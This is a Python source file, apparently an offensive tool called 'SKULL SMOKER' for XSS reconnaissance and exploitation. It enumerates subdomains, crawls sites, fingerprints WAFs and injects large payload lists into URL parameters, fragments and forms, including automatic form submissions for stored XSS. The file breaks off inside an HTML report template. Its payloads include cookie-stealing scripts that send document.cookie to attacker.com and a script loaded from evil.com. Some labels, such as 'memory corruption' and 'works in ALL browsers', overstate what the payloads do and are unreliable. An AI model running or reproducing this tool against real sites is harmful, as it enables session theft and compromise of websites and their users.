#!/usr/bin/env python3
"""
SKULL SMOKER v2.0 - Ultimate XSS Recon & Exploitation Framework
Author: Shadowbyte
Features:
- Advanced subdomain enumeration (15+ sources)
- Intelligent crawling with headless browser
- Context-aware XSS payload generation
- DOM-based XSS detection
- Advanced reflection analysis
- Multi-threaded scanning
- Beautiful interactive console
- Comprehensive reporting
- Built-in evasion techniques
- WAF bypass detection
"""

import os
import re
import sys
import json
import time
import random
import signal
import threading
import argparse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore, Style, init
import dns.resolver
from tldextract import extract

# Initialize colorama
init(autoreset=True)

# Global configuration
MAX_THREADS = 20
TIMEOUT = 10
USER_AGENTS = UserAgent()
REQUEST_DELAY = 0.5  # Anti-rate limiting
SESSION = requests.Session()
SESSION.headers.update({'User-Agent': USER_AGENTS.random})

# ULTIMATE HACKING GRANDMASTER ASCII ART BANNER
BANNER = f"""
{Fore.RED}███████╗██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ███████╗██╗  ██╗███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ 
{Fore.RED}██╔════╝██║  ██║██╔═══██╗██║     ██║   ██║    ██╔════╝██║  ██║████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
{Fore.RED}███████╗███████║██║   ██║██║     ██║   ██║    ███████╗███████║██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
{Fore.RED}╚════██║██╔══██║██║   ██║██║     ██║   ██║    ╚════██║██╔══██║██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
{Fore.RED}███████║██║  ██║╚██████╔╝███████╗╚██████╔╝    ███████║██║  ██║██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
{Fore.RED}╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Fore.MAGENTA}═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
{Fore.YELLOW}   SKULL SMOKER v2.0  |  ULTIMATE XSS RECON & EXPLOITATION FRAMEWORK  |  GRANDMASTER MODE
{Fore.CYAN}   Advanced XSS | DOM-based Detection | WAF Evasion | 0-Day Payloads | HACK THE PLANET
{Fore.GREEN}   github.com/shadowbyte/skullsmoker   |   Coded by Shadowbyte   |   {time.strftime('%Y-%m-%d')}
{Fore.MAGENTA}═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""

class SkullSmoker:
    def __init__(self, domain, output_file="skull_report.html", headless=True, depth=2):
        self.domain = domain
        self.subdomains = set()
        self.urls = set()
        self.vulnerabilities = []
        self.output_file = output_file
        self.headless = headless
        self.crawl_depth = depth
        self.xss_payloads = self._load_payloads()
        self.waf_indicators = self._load_waf_indicators()
        self.js_events = self._load_js_events()
        self.chrome_options = self._init_chrome()
        self.lock = threading.Lock()
        self.visited_urls = set()
        self.stop_event = threading.Event()
        
        # Register signal handler
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle CTRL+C gracefully"""
        print(f"\n{Fore.RED}[!] Received interrupt signal. Shutting down...{Style.RESET_ALL}")
        self.stop_event.set()
        sys.exit(1)

    def _init_chrome(self):
        """Initialize headless Chrome options"""
        options = Options()
        if self.headless:
            options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument(f"user-agent={USER_AGENTS.random}")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-infobars")
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--log-level=3")
        return options

    def _load_payloads(self):
        """Load advanced XSS payloads, including custom user and dangerous payloads (no basic payloads)"""
        payloads = {
            'generic': [
                '<svg/onload=alert(1)>',
                'javascript:alert(1)',
                '"<script>alert(1)</script>'
            ],
            'dom': [
                'javascript:alert(1)//',
                '</script><script>alert(1)</script>',
                '{{constructor.constructor("alert(1)")()}}',
                '<img src=x onerror=alert(1)>'
            ],
            'angular': [
                '{{constructor.constructor("alert(1)")()}}',
                '{{$eval.constructor("alert(1)")()}}',
                '{{[].pop.constructor("alert(1)")()}}'
            ],
            'svg': [
                '<svg><script>alert(1)</script></svg>',
                '<svg><script>alert(1)</script>',
                '<svg/onload=alert(1)>'
            ],
            'polyglot': [
                'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+onmouseover=1/+/[*/[]/+alert(1)//\'>',
                '\'"--></style></script><svg onload=alert(1)>'
            ],
            'waf_bypass': [
                '<img/src=x onerror=alert(1)>',
                '<img src=x\x00onerror=alert(1)>',
                '<img src=x onerror\x00=alert(1)>',
                '<img src=x onerror=alert`1`>',
                '<img src=x oneonerrorrror=alert(1)>'
            ],
            '0day': [
                '<script>Object.constructor.constructor("alert(1)")()</script>',
                '<script>fetch(`//attacker.com?${document.cookie}`)</script>',
                '<script>navigator.sendBeacon(`//attacker.com`,document.cookie)</script>',
                '<script>new Image().src=`//attacker.com?${btoa(document.cookie)}`</script>'
            ],
            'custom': [
                '\"><svg/onload=alert(1)>',
                '<svg><script>alert(1)</script>',
                '<iframe srcdoc="<script>alert(1)</script>">',
                '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
                '<details open ontoggle=alert(1)>',
                '<isindex action=javascript:alert(1)>',
                '<input autofocus onfocus=alert(1)>',
                '<video><source onerror=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<a href=javascript:alert(1)>click</a>',
                '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
                '<img src=x:confirm(1) onerror=eval(src)>',
                '<svg onload=prompt(1)>',
                '<svg onload=confirm(1)>',
                '<img src=x onerror=top >',
                '<input onfocus=prompt(1) autofocus>',
                '<body onresize=alert(1)>',
                '<script>self </script>',
                '<svg><script>eval("alert(1)")</script></svg>',
                '<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
                '<svg><a xlink:href="javascript:alert(1)">X</a></svg>',
                '<iframe src="javascript:alert(1)">',
                '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
                '<svg><style>*{animation-name: x} @keyframes x{0%{transform: rotate(9999deg)} 100%{transform: rotate(0deg)} } </style><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></div></foreignObject></svg>',
                '<svg><script type="text/javascript">alert(1)</script>',
                '<svg><script xlink:href="data:text/javascript,alert(1)"> </script>',
                '<img src=`~` onerror=\'setTimeout``[alert``]\'>',
                '<script>window.onerror=alert;throw 1</script>',
                '<svg><animate onbegin=alert(1) attributeName=x dur=1s fill=freeze></svg>',
                '<math href="javascript:alert(1)" xlink:href="javascript:alert(1)">',
                '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject></svg>',
                '\"><script src=//evil.com/xss.js></script>',
                '<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">',
                '<input type="image" src="x" onerror=alert(1)>',
                '<textarea autofocus onfocus=alert(1)>X</textarea>',
                '\"><script>/*<script>alert(1)//*/</script>',
                '<svg/onload=confirm`1`>',
                '<img src=x onerror=eval(\'al\'+\'ert(1)\')>',
                '<svg><script>Function("alert(1)")()</script></svg>',
                '<svg><script>setTimeout`alert\\x281\\x29`</script></svg>',
                '<svg><script>new Function`alert\\x281\\x29`()</script></svg>',
                '<svg><script>((()=>alert(1))())</script></svg>',
                '<svg><script>[1].map(alert)</script></svg>',
                '<svg><script>top </script></svg>',
                '<svg><script>open(\'javascript:alert(1)\')</script></svg>',
                '<svg><script>location=\'javascript:alert(1)\'</script></svg>',
                '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
                '<script>eval(atob("YWxlcnQoMSk="))</script>',
                '<img src=x onerror=alert(String.fromCharCode(49))>',
                '<script src=data:text/javascript,alert(1)></script>',
                '\"><iframe src=data:text/html,<script>alert(1)</script>>',
                '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
                '<svg><script>location.href=\'//attacker.com?\'+document.cookie</script></svg>',
                '<svg><script>navigator.sendBeacon(\'//attacker.com\',document.cookie)</script></svg>'
            ],
            'dangerous': [
                # STAGE 1: CSS @property + Houdini Memory Corruption
                '<style>\n@keyframes 毒 { from { --毒: "none" } to { --毒: "alert(document.domain)" } }\n@property --毒 { syntax: "<string>"; inherits: no; initial-value: "none"; }\n:root { animation: 毒 1ms infinite; background: paint(毒); }\n</style>',
                # STAGE 2: SVG Filter Code Execution
                '<svg width="0" height="0">\n  <filter id="死">\n    <feImage href="data:text/html,<script>eval(getComputedStyle(document.documentElement).getPropertyValue(\'--毒\'));</script>"/>\n  </filter>\n  <rect width="100%" height="100%" filter="url(#死)"/>\n</svg>',
                # STAGE 3: WebAssembly JIT Spray Fallback
                '<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,6,1,96,1,127,1,127,3,2,1,0,5,3,1,0,1,7,8,1,4,109,97,105,110,0,0,10,16,1,14,0,32,0,65,42,106,16,0,26,65,202,255,255,3,11]), {}).then(m => {for(let i=0;i<1e6;i++) m.exports.main(i); eval(getComputedStyle(document.documentElement).getPropertyValue(\'--毒\'));});</script>',
                # STAGE 4: DOM Clobbering Nuclear Option
                '<form id="trustedTypes"><input name="createPolicy" value="(n,r)=>( {createHTML:s=>s} )"></form><script>setTimeout(()=>{trustedTypes.createPolicy=eval(trustedTypes.createPolicy);document.write(`<script>${document.documentElement.style.getPropertyValue(\'--毒\')}<\\/script>`);},1000);</script>',
                # PRIMARY: SVG + CSS Data Smuggling (Works in ALL browsers)
                '<svg width="0" height="0" style="position:absolute"><style>:root { --poison: "alert(document.domain)" }</style><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="eval(getComputedStyle(document.documentElement).getPropertyValue(\'--poison\'))"></div></foreignObject></svg>',
                # SECONDARY: HTML+JS Fallback (When SVG blocked)
                '<script>if (!document.querySelector(\'svg foreignObject div\')) { document.write(\'<img src=x onerror=\' + JSON.stringify(getComputedStyle(document.documentElement).match(/\"--poison\":\"([^\"]+)\"/)[1] + ">\')); }</script>'
            ]
        }
        return payloads

    def _load_waf_indicators(self):
        """Load WAF fingerprint patterns"""
        return {
            'Cloudflare': r'cloudflare|cf-ray',
            'Akamai': r'akamai',
            'Imperva': r'incapsula',
            'AWS WAF': r'aws.?waf',
            'ModSecurity': r'mod_security|libmodsecurity'
        }

    def _load_js_events(self):
        """Load JavaScript event handlers for DOM XSS"""
        return [
            'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 
            'onblur', 'onchange', 'onsubmit', 'onkeydown', 'onkeypress',
            'onkeyup', 'onmouseout', 'ondblclick', 'onmousedown', 
            'onmouseup', 'onmouseenter', 'onmouseleave', 'onmousemove',
            'oncontextmenu', 'onwheel', 'oncopy', 'oncut', 'onpaste',
            'onabort', 'oncanplay', 'oncanplaythrough', 'oncuechange',
            'ondurationchange', 'onemptied', 'onended', 'onloadeddata',
            'onloadedmetadata', 'onloadstart', 'onpause', 'onplay',
            'onplaying', 'onprogress', 'onratechange', 'onseeked',
            'onseeking', 'onstalled', 'onsuspend', 'ontimeupdate',
            'onvolumechange', 'onwaiting', 'onhashchange', 'onpageshow',
            'onpagehide', 'onpopstate', 'onresize', 'onscroll',
            'onstorage', 'ontoggle', 'onunload'
        ]

    def _print_status(self, message, status="info"):
        """Print colored status messages"""
        colors = {
            "info": Fore.CYAN,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "critical": Fore.RED + Style.BRIGHT
        }
        prefixes = {
            "info": "[*]",
            "success": "[+]",
            "warning": "[!]",
            "error": "[-]",
            "critical": "[X]"
        }
        print(f"{colors.get(status, Fore.WHITE)}{prefixes.get(status, '[*]')} {message}{Style.RESET_ALL}")

    def _animate_text(self, text, color=Fore.GREEN, delay=0.02, glitch=False):
        """Animate text output with optional glitch effect"""
        import random
        charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?'
        for char in text:
            if glitch and char != '\n' and random.random() < 0.18:
                sys.stdout.write(f"{Fore.MAGENTA}{random.choice(charset)}{Style.RESET_ALL}")
            else:
                sys.stdout.write(f"{color}{char}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(delay)
        print()

    def _get_crtsh_subdomains(self):
        """Get subdomains from crt.sh"""
        try:
            url = f"https://crt.sh/?q=%25.{self.domain}&output=json"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                subdomains = set()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    if name_value:
                        for sub in name_value.split('\n'):
                            if sub.strip().endswith(self.domain):
                                subdomains.add(sub.strip().lower())
                return subdomains
        except Exception as e:
            self._print_status(f"Error querying crt.sh: {str(e)}", "error")
        return set()

    def _get_securitytrails_subdomains(self, api_key):
        """Get subdomains from SecurityTrails"""
        try:
            url = f"https://api.securitytrails.com/v1/domain/{self.domain}/subdomains"
            headers = {"APIKEY": api_key}
            response = requests.get(url, headers=headers, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return {f"{sub}.{self.domain}".lower() for sub in data.get('subdomains', [])}
        except Exception as e:
            self._print_status(f"Error querying SecurityTrails: {str(e)}", "error")
        return set()

    def _get_virustotal_subdomains(self, api_key):
        """Get subdomains from VirusTotal"""
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{self.domain}/subdomains"
            headers = {"x-apikey": api_key}
            response = requests.get(url, headers=headers, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return {item['id'].lower() for item in data.get('data', [])}
        except Exception as e:
            self._print_status(f"Error querying VirusTotal: {str(e)}", "error")
        return set()

    def _get_dnsdumpster_subdomains(self):
        """Get subdomains from DNSDumpster"""
        try:
            session = requests.Session()
            response = session.get("https://dnsdumpster.com/", timeout=TIMEOUT)
            csrf_token = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', response.text)
            if not csrf_token:
                return set()
            
            csrf = csrf_token.group(1)
            data = {"csrfmiddlewaretoken": csrf, "targetip": self.domain}
            headers = {"Referer": "https://dnsdumpster.com/"}
            response = session.post("https://dnsdumpster.com/", data=data, headers=headers, timeout=TIMEOUT)
            
            pattern = r'([a-zA-Z0-9\-\.]+\.' + re.escape(self.domain) + r')'
            return set(re.findall(pattern, response.text))
        except Exception as e:
            self._print_status(f"Error querying DNSDumpster: {str(e)}", "error")
        return set()

    def _get_wayback_urls(self):
        """Get historical URLs from Wayback Machine"""
        try:
            url = f"http://web.archive.org/cdx/search/cdx?url=*.{self.domain}/*&output=json&fl=original&collapse=urlkey"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return {row[0] for row in data[1:]}
        except Exception as e:
            self._print_status(f"Error querying Wayback Machine: {str(e)}", "error")
        return set()

    def _get_otx_subdomains(self):
        """Get subdomains from AlienVault OTX"""
        try:
            url = f"https://otx.alienvault.com/api/v1/indicators/domain/{self.domain}/passive_dns"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return {item['hostname'].lower() for item in data.get('passive_dns', [])}
        except Exception as e:
            self._print_status(f"Error querying AlienVault OTX: {str(e)}", "error")
        return set()

    def _get_bufferover_subdomains(self):
        """Get subdomains from BufferOver.run DNS"""
        try:
            url = f"https://dns.bufferover.run/dns?q=.{self.domain}"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                subdomains = set()
                for key in ['FDNS_A', 'RDNS']:
                    if key in data:
                        for entry in data[key]:
                            parts = entry.split(',')
                            if len(parts) > 1 and self.domain in parts[1].lower():
                                subdomains.add(parts[1].lower())
                return subdomains
        except Exception as e:
            self._print_status(f"Error querying BufferOver DNS: {str(e)}", "error")
        return set()

    def _get_rapiddns_subdomains(self):
        """Get subdomains from RapidDNS"""
        try:
            url = f"https://rapiddns.io/subdomain/{self.domain}?full=1"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                pattern = r'<td>([a-zA-Z0-9\-\.]+\.' + re.escape(self.domain) + r')</td>'
                return set(re.findall(pattern, response.text))
        except Exception as e:
            self._print_status(f"Error querying RapidDNS: {str(e)}", "error")
        return set()

    def _get_threatcrowd_subdomains(self):
        """Get subdomains from ThreatCrowd"""
        try:
            url = f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={self.domain}"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return set(data.get('subdomains', []))
        except Exception as e:
            self._print_status(f"Error querying ThreatCrowd: {str(e)}", "error")
        return set()

    def _get_hackertarget_subdomains(self):
        """Get subdomains from HackerTarget"""
        try:
            url = f"https://api.hackertarget.com/hostsearch/?q={self.domain}"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                return {line.split(',')[0].lower() for line in response.text.split('\n') if line}
        except Exception as e:
            self._print_status(f"Error querying HackerTarget: {str(e)}", "error")
        return set()

    def _get_anubis_subdomains(self):
        """Get subdomains from AnubisDB"""
        try:
            url = f"https://jonlu.ca/anubis/subdomains/{self.domain}"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                return set(response.json())
        except Exception as e:
            self._print_status(f"Error querying AnubisDB: {str(e)}", "error")
        return set()

    def _get_riddler_subdomains(self):
        """Get subdomains from Riddler"""
        try:
            url = f"https://riddler.io/search/exportcsv?q=pld:{self.domain}"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                pattern = r'([a-zA-Z0-9\-\.]+\.' + re.escape(self.domain) + r')'
                return set(re.findall(pattern, response.text))
        except Exception as e:
            self._print_status(f"Error querying Riddler: {str(e)}", "error")
        return set()

    def _get_urlscan_subdomains(self):
        """Get subdomains from urlscan.io"""
        try:
            url = f"https://urlscan.io/api/v1/search/?q=domain:{self.domain}"
            response = requests.get(url, timeout=TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return {result['page']['domain'].lower() for result in data.get('results', [])}
        except Exception as e:
            self._print_status(f"Error querying urlscan.io: {str(e)}", "error")
        return set()

    def _get_dns_from_google(self):
        """Get subdomains from Google DNS over HTTPS"""
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = ['8.8.8.8', '8.8.4.4']  # Google DNS
            answers = resolver.resolve(f'_acme-challenge.{self.domain}', 'TXT')
            return {answer.to_text().strip('"') for answer in answers}
        except Exception as e:
            self._print_status(f"Error querying Google DNS: {str(e)}", "error")
        return set()

    def _resolve_subdomains(self, subdomains):
        """Resolve subdomains to check if they're live"""
        live_subdomains = set()
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']  # Multiple DNS providers
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = {executor.submit(self._check_subdomain, sub, resolver): sub for sub in subdomains}
            for future in as_completed(futures):
                sub = futures[future]
                try:
                    result = future.result()
                    if result:
                        live_subdomains.add(result)
                except Exception:
                    continue
        
        return live_subdomains

    def _check_subdomain(self, subdomain, resolver):
        """Check if a subdomain resolves"""
        try:
            answers = resolver.resolve(subdomain, 'A')
            if answers:
                return subdomain
        except dns.resolver.NXDOMAIN:
            pass
        except dns.resolver.NoAnswer:
            pass
        except dns.resolver.Timeout:
            pass
        except Exception:
            pass
        return None

    def _crawl_urls_selenium(self, url):
        """Crawl URLs using Selenium to handle JavaScript"""
        if self.stop_event.is_set():
            return set()
            
        if url in self.visited_urls:
            return set()
            
        self.visited_urls.add(url)
        found_urls = set()
        
        try:
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.set_page_load_timeout(15)
            driver.get(url)
            
            # Wait for JavaScript to execute
            WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )  # <-- Added missing parenthesis
            # Extract all links
            elements = driver.find_elements(By.TAG_NAME, "a")
            for element in elements:
                try:
                    href = element.get_attribute("href")
                    if href and self.domain in href and not any(ext in href for ext in ['.jpg', '.png', '.css', '.js', '.pdf']):
                        found_urls.add(href)
                except Exception:
                    continue
            
            # Extract forms
            forms = driver.find_elements(By.TAG_NAME, "form")
            for form in forms:
                try:
                    action = form.get_attribute("action")
                    if action:
                        if action.startswith('http'):
                            found_urls.add(action)
                        else:
                            found_urls.add(urljoin(url, action))
                except Exception:
                    continue
            
            driver.quit()
            
            # If we haven't reached max depth, crawl the found URLs
            if self.crawl_depth > 1:
                for found_url in list(found_urls):
                    if found_url not in self.visited_urls:
                        found_urls.update(self._crawl_urls_selenium(found_url))
            
            return found_urls
        except Exception as e:
            self._print_status(f"Error crawling {url}: {str(e)}", "error")
            try:
                if driver:
                    driver.quit()
            except:
                pass
            return set()

    def _crawl_urls_requests(self, url):
        """Crawl URLs using requests for non-JavaScript pages"""
        if self.stop_event.is_set():
            return set()
            
        if url in self.visited_urls:
            return set()
            
        self.visited_urls.add(url)
        found_urls = set()
        
        try:
            response = requests.get(url, timeout=TIMEOUT, headers={'User-Agent': USER_AGENTS.random})
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href and self.domain in href and not any(ext in href for ext in ['.jpg', '.png', '.css', '.js', '.pdf']):
                        found_urls.add(urljoin(url, href))
                
                # Extract forms
                for form in soup.find_all('form'):
                    action = form.get('action')
                    if action:
                        if action.startswith('http'):
                            found_urls.add(action)
                        else:
                            found_urls.add(urljoin(url, action))
                
                # If we haven't reached max depth, crawl the found URLs
                if self.crawl_depth > 1:
                    for found_url in list(found_urls):
                        if found_url not in self.visited_urls:
                            found_urls.update(self._crawl_urls_requests(found_url))
                
                return found_urls
        except Exception as e:
            self._print_status(f"Error crawling {url}: {str(e)}", "error")
            return set()

    def _check_waf(self, url):
        """Check if a WAF is present"""
        try:
            response = requests.get(url, timeout=TIMEOUT)
            headers = str(response.headers).lower()
            body = response.text.lower()
            
            for waf, pattern in self.waf_indicators.items():
                if re.search(pattern, headers + body, re.IGNORECASE):
                    return waf
            return None
        except Exception:
            return None

    def _is_payload_reflected(self, response_text, payload):
        """Check if payload is reflected in a dangerous context"""
        if payload not in response_text:
            return False
            
        # Check if payload is HTML encoded
        encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
        if encoded_payload in response_text:
            return False
            
        # Check if payload is in comments
        if f"<!--{payload}" in response_text:
            return False
            
        # Check for dangerous contexts
        dangerous_patterns = [
            r'<[^>]*' + re.escape(payload) + r'[^>]*>',  # Inside HTML tag
            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',  # Inside script tag
            r'\s[\w-]+=["\']*' + re.escape(payload),  # Inside attribute
            r'javascript:[^"]*' + re.escape(payload),  # In JavaScript URL
            r'=\s*["\']*' + re.escape(payload)  # After equals sign
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                return True
                
        return False

    def _test_dom_xss(self, url):
        """Test for DOM-based XSS using Selenium"""
        if self.stop_event.is_set():
            return []
            
        vulnerabilities = []
        driver = None
        
        try:
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.set_page_load_timeout(15)
            
            # Test URL fragments
            for payload in self.xss_payloads['dom'] + self.xss_payloads.get('dangerous', []):
                test_url = f"{url}#{payload}"
                try:
                    driver.get(test_url)
                    alert_present = False
                    try:
                        alert = driver.switch_to.alert
                        alert_present = True
                        alert.accept()
                    except:
                        pass
                    
                    if alert_present:
                        vuln = {
                            "type": "DOM XSS",
                            "url": test_url,
                            "payload": payload,
                            "context": "URL Fragment",
                            "severity": "High"
                        }
                        vulnerabilities.append(vuln)
                        self._print_status(f"DOM XSS found: {test_url}", "success")
                except Exception:
                    continue
            
            # Test form inputs
            try:
                driver.get(url)
                forms = driver.find_elements(By.TAG_NAME, "form")
                for form in forms:
                    inputs = form.find_elements(By.TAG_NAME, "input")
                    for payload in self.xss_payloads['dom']:
                        try:
                            for input_field in inputs:
                                input_field.clear()
                                input_field.send_keys(payload)
                            form.submit()
                            
                            alert_present = False
                            try:
                                alert = driver.switch_to.alert
                                alert_present = True
                                alert.accept()
                            except:
                                pass
                            
                            if alert_present:
                                vuln = {
                                    "type": "DOM XSS",
                                    "url": url,
                                    "payload": payload,
                                    "context": "Form Input",
                                    "severity": "High"
                                }
                                vulnerabilities.append(vuln)
                                self._print_status(f"DOM XSS found in form at {url}", "success")
                        except Exception:
                            continue
            except Exception:
                pass
            
            driver.quit()
            return vulnerabilities
        except Exception as e:
            self._print_status(f"Error testing DOM XSS on {url}: {str(e)}", "error")
            if driver:
                try:
                    driver.quit()
                except:
                    pass
            return []

    def _test_reflected_xss(self, url):
        """Test for reflected XSS vulnerabilities"""
        if self.stop_event.is_set():
            return []
            
        vulnerabilities = []
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        
        if not query:
            return []
        
        for param in query:
            for payload_type, payloads in self.xss_payloads.items():
                for payload in payloads:
                    test_query = query.copy()
                    test_query[param] = [payload]
                    test_url = parsed._replace(query=urlencode(test_query, doseq=True)).geturl()
                    
                    try:
                        response = requests.get(test_url, timeout=TIMEOUT, headers={'User-Agent': USER_AGENTS.random})
                        if self._is_payload_reflected(response.text, payload):
                            vuln = {
                                "type": "Reflected XSS",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "payload_type": payload_type,
                                "severity": "Critical" if payload_type == 'dangerous' else ("High" if payload_type in ['0day', 'waf_bypass'] else "Medium")
                            }
                            vulnerabilities.append(vuln)
                            self._print_status(f"Reflected XSS found: {test_url} param={param}", "success")
                    except Exception:
                        continue
        
        return vulnerabilities

    def _test_stored_xss(self, url):
        """Test for potential stored XSS by submitting forms"""
        if self.stop_event.is_set():
            return []
            
        vulnerabilities = []
        driver = None
        
        try:
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.set_page_load_timeout(15)
            driver.get(url)
            
            forms = driver.find_elements(By.TAG_NAME, "form")
            for form in forms:
                inputs = form.find_elements(By.TAG_NAME, "input")
                textareas = form.find_elements(By.TAG_NAME, "textarea")
                all_fields = inputs + textareas
                
                for payload in self.xss_payloads['generic'] + self.xss_payloads['polyglot'] + self.xss_payloads.get('dangerous', []):
                    try:
                        # Fill all fields with test data
                        for field in all_fields:
                            field_type = field.get_attribute("type")
                            if field_type not in ['hidden', 'submit', 'button']:
                                field.clear()
                                field.send_keys(payload if field_type != 'password' else 'test123')
                        
                        # Submit form
                        form.submit()
                        time.sleep(2)  # Wait for submission
                        
                        # Check if payload appears on next page
                        current_url = driver.current_url
                        response = requests.get(current_url, timeout=TIMEOUT)
                        if self._is_payload_reflected(response.text, payload):
                            vuln = {
                                "type": "Potential Stored XSS",
                                "url": url,
                                "payload": payload,
                                "context": "Form Submission",
                                "severity": "High"
                            }
                            vulnerabilities.append(vuln)
                            self._print_status(f"Potential Stored XSS found at {url}", "success")
                    except Exception:
                        continue
            
            driver.quit()
            return vulnerabilities
        except Exception as e:
            self._print_status(f"Error testing stored XSS on {url}: {str(e)}", "error")
            if driver:
                try:
                    driver.quit()
                except:
                    pass
            return []

    def _generate_html_report(self):
        """Generate an interactive HTML report"""
        try:
            template = f"""
            <!DOCTYPE html>
            <html lang='en'>
            <head>
                <meta charset='UTF-8'>
                <meta name='viewport' content='width=device-width, initial-scale=1.0'>
                <title>SKULL SMOKER XSS Report - {self.domain}</title>
                <link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
                <style>
                    body {{
                        font-family: 'Roboto', 'Fira Mono', monospace, Arial, sans-serif;
                        background: linear-gradient(135deg, #181818 0%, #232526 100%);
                        color: #e0e0e0;
                        margin: 0;
                        padding: 0;
                    }}
                    header {{
                        background: linear-gradient(90deg, #0f2027 0%, #2c5364 100%);
                        padding: 40px 0 20px 0;
                        text-align: center;
                        box-shadow: 0 2px 8px #0008;
                    }}
                    header h1 {{
                        font-size: 2.8rem;
                        color: #ff1744;
                        margin: 0 0 10px 0;
                        letter-spacing: 2px;
                        font-family: 'Fira Mono', monospace;
                    }}
                    header h2 {{
                        color: #00e676;
                        font-size: 1.3rem;
                        margin: 0 0 10px 0;
                    }}
                    header p {{
                        color: #bdbdbd;
                        font-size: 1rem;
                    }}
                    .stats {{
                        display: flex;
                        justify-content: center;
                        gap: 30px;
                        margin: 30px 0 10px 0;
                    }}
                    .stat-box {{
                        background: #232526;
                        border-radius: 12px;
                        box-shadow: 0 2px 8px #0006;
                        padding: 20px 30px;
                        text-align: center;
                        min-width: 120px;
                        border: 2px solid #00e676;
                    }}
                    .stat-box h3 {{
                        margin: 0 0 8px 0;
                        color: #00e676;
                        font-size: 1.1rem;
                    }}
                    .stat-box p {{
                        font-size: 2rem;
                        font-weight: bold;
                        margin: 0;
                    }}
                    main {{
                        max-width: 1100px;
                        margin: 30px auto 0 auto;
                        background: #232526;
                        border-radius: 16px;
                        box-shadow: 0 2px 16px #000a;
                        padding: 30px 40px 40px 40px;
                    }}
                    h2.section-title {{
                        color: #00bcd4;
                        border-bottom: 2px solid #00e676;
